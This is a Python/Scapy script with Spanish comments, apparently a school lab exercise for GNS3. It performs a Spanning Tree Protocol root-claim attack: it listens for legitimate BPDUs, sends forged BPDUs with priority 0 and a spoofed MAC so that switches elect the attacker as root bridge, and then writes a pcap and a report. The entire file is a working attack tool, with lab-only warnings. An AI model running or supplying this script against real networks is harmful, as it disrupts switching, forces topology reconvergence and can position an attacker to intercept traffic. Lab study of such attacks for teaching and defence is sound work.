#!/usr/bin/env python3
"""
stp_root_claim.py — Práctica Escolar: STP Root Role Claim Attack
Uso  : sudo python3 stp_root_claim.py -i eth0 [-n 30] [-p 0] [-m aa:bb:cc:dd:ee:ff]
Req  : pip install scapy  |  Kali Linux + GNS3

ADVERTENCIA: Solo en entornos de laboratorio controlados y aislados.
"""

import argparse
import time
import threading
import sys
from datetime import datetime

try:
    from scapy.all import Ether, LLC, STP, sendp, sniff, wrpcap
except ImportError:
    print("[!] Scapy no encontrado. Instalar con: pip install scapy")
    sys.exit(1)

# ── Colores ──────────────────────────────────────────────────
R = '\033[0;31m'; Y = '\033[1;33m'; G = '\033[0;32m'
B = '\033[0;34m'; C = '\033[0;36m'; NC = '\033[0m'

# ── Argumentos ───────────────────────────────────────────────
parser = argparse.ArgumentParser(
    description='STP Root Claim Attack — Práctica Escolar'
)
parser.add_argument('-i', '--iface',    default='eth0',              help='Interfaz de red (default: eth0)')
parser.add_argument('-n', '--count',    type=int, default=30,        help='Número de BPDUs a enviar (default: 30)')
parser.add_argument('-p', '--priority', type=int, default=0,         help='Prioridad del Root Bridge falso (default: 0)')
parser.add_argument('-m', '--mac',      default='aa:bb:cc:dd:ee:ff', help='MAC del Root Bridge falso')
parser.add_argument('-o', '--output',   default='/tmp/stp_lab.pcap', help='Archivo de captura de salida')
args = parser.parse_args()

# ── Estado global ────────────────────────────────────────────
captured_bpdus = []
stop_sniff     = threading.Event()
legit_roots    = set()

# ── Banner ───────────────────────────────────────────────────
def banner():
    print(f"{B}")
    print("  ╔═══════════════════════════════════════════╗")
    print("  ║   STP Root Claim — Práctica Escolar       ║")
    print("  ║   Solo en entornos de laboratorio         ║")
    print("  ╚═══════════════════════════════════════════╝")
    print(f"{NC}")
    print(f"  Interfaz  : {C}{args.iface}{NC}")
    print(f"  Prioridad : {R}{args.priority}{NC}  (legítima suele ser 4096–32768)")
    print(f"  MAC falsa : {R}{args.mac}{NC}")
    print(f"  BPDUs     : {args.count}")
    print(f"  Captura   : {args.output}")
    print()

# ── Verificar root ───────────────────────────────────────────
def check_root():
    if __import__('os').geteuid() != 0:
        print(f"{R}[!] Ejecutar como root: sudo python3 {sys.argv[0]}{NC}")
        sys.exit(1)

# ── Hilo de captura: escucha BPDUs legítimos ─────────────────
def capture_thread():
    def process(pkt):
        if pkt.haslayer(STP):
            captured_bpdus.append(pkt)
            src   = pkt[Ether].src
            prio  = pkt[STP].rootid
            rmac  = pkt[STP].rootmac
            ts    = datetime.now().strftime('%H:%M:%S')
            legit_roots.add((prio, rmac))
            color = G if prio >= 4096 else R
            flag  = '' if prio >= 4096 else f' {R}← SOSPECHOSO{NC}'
            print(f"  {color}[{ts}] BPDU capturado{NC}  src={src}  rootid={prio}  rootmac={rmac}{flag}")

    sniff(
        iface=args.iface,
        filter="stp",
        prn=process,
        stop_filter=lambda _: stop_sniff.is_set(),
        store=False
    )

# ── Construir BPDU falso ──────────────────────────────────────
def build_bpdu():
    return (
        Ether(dst="01:80:c2:00:00:00", src=args.mac) /
        LLC(dsap=0x42, ssap=0x42, ctrl=3) /
        STP(
            proto      = 0,
            version    = 0,
            bpdutype   = 0,
            rootid     = args.priority,
            rootmac    = args.mac,
            pathcost   = 0,
            bridgeid   = args.priority,
            bridgemac  = args.mac,
            portid     = 0x8001,
            age        = 0,
            maxage     = 20,
            hellotime  = 2,
            fwddelay   = 15
        )
    )

# ── Fase 1: Escuchar topología legítima ───────────────────────
def phase_listen():
    print(f"{C}[FASE 1] Escuchando BPDUs legítimos durante 6 segundos...{NC}")
    t = threading.Thread(target=capture_thread, daemon=True)
    t.start()
    time.sleep(6)
    if legit_roots:
        print(f"\n{G}  Root Bridges detectados en la red:{NC}")
        for prio, mac in sorted(legit_roots):
            print(f"    prioridad={prio}  mac={mac}")
    else:
        print(f"{Y}  No se detectaron BPDUs (¿red activa?){NC}")
    print()

# ── Fase 2: Enviar BPDUs falsos ───────────────────────────────
def phase_attack():
    bpdu = build_bpdu()
    print(f"{R}[FASE 2] Enviando {args.count} BPDUs falsos (prioridad={args.priority})...{NC}")
    print(f"{Y}         Los switches reconvergerán — la red puede volverse inestable 30-50s.{NC}\n")
    for i in range(1, args.count + 1):
        sendp(bpdu, iface=args.iface, verbose=0)
        ts = datetime.now().strftime('%H:%M:%S')
        print(f"  [{ts}] BPDU #{i}/{args.count} enviado  prio={args.priority}  mac={args.mac}")
        time.sleep(2)
    print()

# ── Fase 3: Guardar captura y reporte ─────────────────────────
def phase_report():
    stop_sniff.set()
    time.sleep(1)

    print(f"{C}[FASE 3] Análisis y reporte:{NC}")
    print(f"  BPDUs capturados totales : {len(captured_bpdus)}")
    print(f"  Root Bridges legítimos   : {len(legit_roots)}")

    if captured_bpdus:
        wrpcap(args.output, captured_bpdus)
        print(f"\n{G}[✓] Captura guardada: {args.output}{NC}")
        print(f"    Abrir con: wireshark {args.output}")

    print(f"\n{C}[*] Verificar en GNS3:{NC}")
    print(f"    Switch# show spanning-tree | include Root")
    print(f"    → Si la prioridad cambió a {args.priority}, el ataque fue exitoso\n")

    report_path = f"/tmp/stp_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(report_path, 'w') as f:
        f.write(f"STP Root Claim — Reporte\n")
        f.write(f"Fecha     : {datetime.now()}\n")
        f.write(f"Interfaz  : {args.iface}\n")
        f.write(f"Prioridad falsa: {args.priority}\n")
        f.write(f"MAC falsa : {args.mac}\n")
        f.write(f"BPDUs enviados : {args.count}\n")
        f.write(f"BPDUs capturados: {len(captured_bpdus)}\n\n")
        f.write("Root Bridges legítimos detectados:\n")
        for prio, mac in sorted(legit_roots):
            f.write(f"  prioridad={prio}  mac={mac}\n")
    print(f"{G}[✓] Reporte texto guardado: {report_path}{NC}")
    print(f"\n{G}══════════════════════════════════════════{NC}")
    print(f"{G}  Práctica STP completada exitosamente     {NC}")
    print(f"{G}══════════════════════════════════════════{NC}\n")

# ── Main ─────────────────────────────────────────────────────
def main():
    banner()
    check_root()
    print(f"{Y}[!] ADVERTENCIA: Usar SOLO en red de laboratorio aislada.{NC}")
    print(f"    Presiona ENTER para continuar o Ctrl+C para cancelar...")
    input()

    phase_listen()
    phase_attack()
    phase_report()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        stop_sniff.set()
        print(f"\n{Y}[!] Interrumpido por el usuario.{NC}")
        if captured_bpdus:
            wrpcap(args.output, captured_bpdus)
            print(f"{G}[✓] Captura guardada: {args.output}{NC}")
        sys.exit(0)
